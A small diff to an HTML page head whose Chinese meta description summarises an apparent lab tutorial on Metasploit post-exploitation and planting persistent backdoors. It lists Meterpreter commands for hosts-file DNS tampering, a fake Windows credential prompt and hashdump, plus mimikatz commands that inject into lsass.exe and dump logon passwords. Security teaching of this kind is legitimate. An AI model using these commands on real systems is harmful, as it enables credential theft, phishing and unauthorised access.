@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="meterpreter 本部分使用Kali系统\nhost注入 在meterpreter中先使用background将当前连接挂起\nshow options\t查看配置方法\nset ip [自己的ip] 这里的ip是之后目标指向的ip\nset domain [要篡改的域名]\t要伪造什么域名\nset sessions [目标session]\t对哪个session id进行修改\nrun\t运行\n用户认证钓鱼 run post/windows/gather/phish_windows_credentials\n会在目标桌面弹出管理员认证窗口\npassTheHash 必须是system权限\nrun post/windows/gather/hashdump\t获取操作系统的hash值\n可以获取管理员(Administrator)密码加密之后的密码，之后使用穷举的方法破解\nmimikatz（Windows版） 本部分使用Win10攻击机及Win7靶机\n我们使用C:\\tools\\alltools\\密码破解下的mimikatz_trunk.rar软件，将压缩包传入到靶机上并解压，如果不能直接拖动复制（没有安装VM tools）建议使用 免费在线文件传输工具 - 零代码快传\n解压后文件夹内的双击两个快捷方式可一键执行命令，也可进入Win32或x64文件夹（分别对应32和64位）内打开软件控制台手动输入命令\n获取账户密码 其中，在Win32文件夹内有常用命令.txt可供参考:\n1 2 3 4 5 6 7 8 9 10 11 12 privilege::debug 当前进程提升为debug权限 inject::process lsass.exe sekurlsa.dll 注入lsass.exe进程 sekurlsa::logonPasswords 列出所有用户密码 system::user 当前用户名 system::computer 当前主机名 process::list 列出所有进程 process::modules 列出当前加载模块 ts::multirdp 支持多用户远程登录 我们依次执行前三个命令，这时会在wdigest后显示密码\n">
 <title>1.9 msf植入永久后门</title>
